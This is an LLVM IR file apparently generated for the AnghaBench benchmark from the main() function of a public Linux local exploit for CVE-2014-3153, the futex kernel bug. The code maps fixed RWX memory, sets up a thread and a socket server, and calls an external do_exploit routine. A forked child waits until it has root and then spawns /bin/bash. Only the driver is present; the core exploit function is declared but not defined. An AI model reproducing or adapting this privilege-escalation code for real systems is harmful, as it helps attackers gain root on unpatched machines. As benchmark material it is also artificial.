; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_35370.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_35370.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [56 x i8] c"CVE-2014-3153 exploit by Chen Kaiqu(kaiquchen@163.com)\0A\00", align 1
@main_pid = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@iov_base0 = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [14 x i8] c"mmap failed?\0A\00", align 1
@iov_len0 = common dso_local global i32 0, align 4
@MMAP_ADDR_BASE = common dso_local global i64 0, align 8
@MMAP_LEN = common dso_local global i32 0, align 4
@iov_basex = common dso_local global i64 0, align 8
@iov_lenx = common dso_local global i32 0, align 4
@thread_client_to_setup_rt_waiter = common dso_local global i32 0, align 4
@client_to_setup_rt_waiter = common dso_local global i32 0, align 4
@sockfd = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [15 x i8] c"Server failed\0A\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"bin/bash\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %8 = call i32 @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str, i64 0, i64 0))
  %9 = call i32 (...) @gettid()
  store i32 %9, i32* @main_pid, align 4
  %10 = call i64 (...) @fork()
  %11 = icmp eq i64 %10, 0
  br i1 %11, label %12, label %68

12:                                               ; preds = %2
  %13 = load i32, i32* @PROT_READ, align 4
  %14 = load i32, i32* @PROT_WRITE, align 4
  %15 = or i32 %13, %14
  %16 = load i32, i32* @PROT_EXEC, align 4
  %17 = or i32 %15, %16
  %18 = load i32, i32* @MAP_SHARED, align 4
  %19 = load i32, i32* @MAP_FIXED, align 4
  %20 = or i32 %18, %19
  %21 = load i32, i32* @MAP_ANONYMOUS, align 4
  %22 = or i32 %20, %21
  %23 = call i64 @mmap(i8* inttoptr (i64 2952790016 to i8*), i32 65536, i32 %17, i32 %22, i32 -1, i32 0)
  %24 = trunc i64 %23 to i32
  store i32 %24, i32* @iov_base0, align 4
  %25 = load i32, i32* @iov_base0, align 4
  %26 = icmp ult i32 %25, -1342177280
  br i1 %26, label %27, label %29

27:                                               ; preds = %12
  %28 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %76

29:                                               ; preds = %12
  store i32 65536, i32* @iov_len0, align 4
  %30 = load i64, i64* @MMAP_ADDR_BASE, align 8
  %31 = inttoptr i64 %30 to i8*
  %32 = load i32, i32* @MMAP_LEN, align 4
  %33 = load i32, i32* @PROT_READ, align 4
  %34 = load i32, i32* @PROT_WRITE, align 4
  %35 = or i32 %33, %34
  %36 = load i32, i32* @PROT_EXEC, align 4
  %37 = or i32 %35, %36
  %38 = load i32, i32* @MAP_SHARED, align 4
  %39 = load i32, i32* @MAP_FIXED, align 4
  %40 = or i32 %38, %39
  %41 = load i32, i32* @MAP_ANONYMOUS, align 4
  %42 = or i32 %40, %41
  %43 = call i64 @mmap(i8* %31, i32 %32, i32 %37, i32 %42, i32 -1, i32 0)
  store i64 %43, i64* @iov_basex, align 8
  %44 = load i64, i64* @iov_basex, align 8
  %45 = load i64, i64* @MMAP_ADDR_BASE, align 8
  %46 = icmp ult i64 %44, %45
  br i1 %46, label %47, label %49

47:                                               ; preds = %29
  %48 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %76

49:                                               ; preds = %29
  %50 = load i32, i32* @MMAP_LEN, align 4
  store i32 %50, i32* @iov_lenx, align 4
  %51 = load i64, i64* @iov_basex, align 8
  %52 = inttoptr i64 %51 to i8*
  %53 = getelementptr i8, i8* %52, i64 1024
  store i8* %53, i8** %7, align 8
  %54 = load i32, i32* @client_to_setup_rt_waiter, align 4
  %55 = load i8*, i8** %7, align 8
  %56 = call i32 @pthread_create(i32* @thread_client_to_setup_rt_waiter, i32* null, i32 %54, i8* %55)
  %57 = call i64 (...) @server_for_setup_rt_waiter()
  store i64 %57, i64* @sockfd, align 8
  %58 = load i64, i64* @sockfd, align 8
  %59 = icmp slt i64 %58, 0
  br i1 %59, label %60, label %62

60:                                               ; preds = %49
  %61 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %76

62:                                               ; preds = %49
  %63 = load i8*, i8** %7, align 8
  %64 = call i32 @do_exploit(i8* %63)
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %67, label %66

66:                                               ; preds = %62
  store i32 1, i32* %3, align 4
  br label %76

67:                                               ; preds = %62
  store i32 0, i32* %3, align 4
  br label %76

68:                                               ; preds = %2
  br label %69

69:                                               ; preds = %72, %68
  %70 = call i64 (...) @getuid()
  %71 = icmp ne i64 %70, 0
  br i1 %71, label %72, label %74

72:                                               ; preds = %69
  %73 = call i32 @usleep(i32 100)
  br label %69

74:                                               ; preds = %69
  %75 = call i32 @execl(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i32* null)
  store i32 0, i32* %3, align 4
  br label %76

76:                                               ; preds = %74, %67, %66, %60, %47, %27
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @gettid(...) #1

declare dso_local i64 @fork(...) #1

declare dso_local i64 @mmap(i8*, i32, i32, i32, i32, i32) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32, i8*) #1

declare dso_local i64 @server_for_setup_rt_waiter(...) #1

declare dso_local i32 @do_exploit(i8*) #1

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
